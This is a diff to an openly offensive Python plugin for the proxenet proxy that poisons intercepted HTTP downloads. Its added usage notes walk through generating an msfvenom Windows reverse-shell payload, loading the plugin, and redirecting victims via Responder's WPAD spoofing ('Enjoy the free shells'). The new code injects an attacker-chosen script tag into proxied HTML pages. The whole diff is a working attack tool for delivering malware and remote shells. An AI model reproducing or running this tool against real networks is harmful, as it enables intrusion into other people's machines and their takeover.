@@ -2,11 +2,15 @@
 This script will inject malicious content.
 
 How to use:
+- Generate your custom payload using msfvenom
+  ex: $ msfvenom -p windows/reverse_tcp_shell -f raw -b '\x0d\x0a\x00\xff' -o mypayload LHOST=192.168.56.1 LPORT=4444
+- Edit your proxenet config file to point to your payload (option 'msfpayload')
 - Start proxenet and load this script (autoload or manually)
   ex: $ ln -sf proxenet-plugins/oPhishPoison.py proxenet-plugins/autoload/oPhishPoison.py
       $ ./proxenet -b 192.168.56.1 -p 8008
 - Start Responder and point WPAD to proxenet
   ex: # ./Responder.py -v -w -I vboxnet0 -u 192.168.56.1:8008
+- Enjoy the free shells
 
 TODO:
 - add html poisoning: inject b33f javascript
@@ -27,6 +31,7 @@ config.read(CONFIG_FILE)
 path_to_msfpayload   = config.get(PLUGIN_NAME, "msfpayload")
 path_to_python       = config.get(PLUGIN_NAME, "python")
 path_to_xor_payload  = config.get(PLUGIN_NAME, "xor_payload")
+path_to_html         = config.get(PLUGIN_NAME, "html_inject_stub")
 
 file_cache = {}
 
@@ -39,7 +44,7 @@ types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml
          "pdf": "application/pdf",
          "swf": "application/x-shockwave-flash",
          "exe": "application/x-msdos-program",
-
+         "html": "application/html",
          }
 
 
@@ -101,6 +106,16 @@ def replace_with_malicious(http, ctype):
     return True
 
 
+def inject_html(http):
+    pattern = "(</body>)"
+    script = "<script src=\"{}\"></script>".format( path_to_html )
+    repl = "{}\1".format( script )
+    new_page = re.sub(pattern, repl, http.body, count=1, flags=re.IGNORECASE)
+
+    http.body = new_page
+    return http.render()
+
+
 def proxenet_request_hook(rid, request, uri):
     """
     proxenet_request_hook() is not useful now, maybe later.
@@ -124,6 +139,9 @@ def proxenet_response_hook(rid, response, uri):
         if detected_type is None:
             del(http)
             return response
+
+        if detected_type == "html":
+            return inject_html(http)
 
         if replace_with_malicious(http, detected_type) == False:
             del(http)
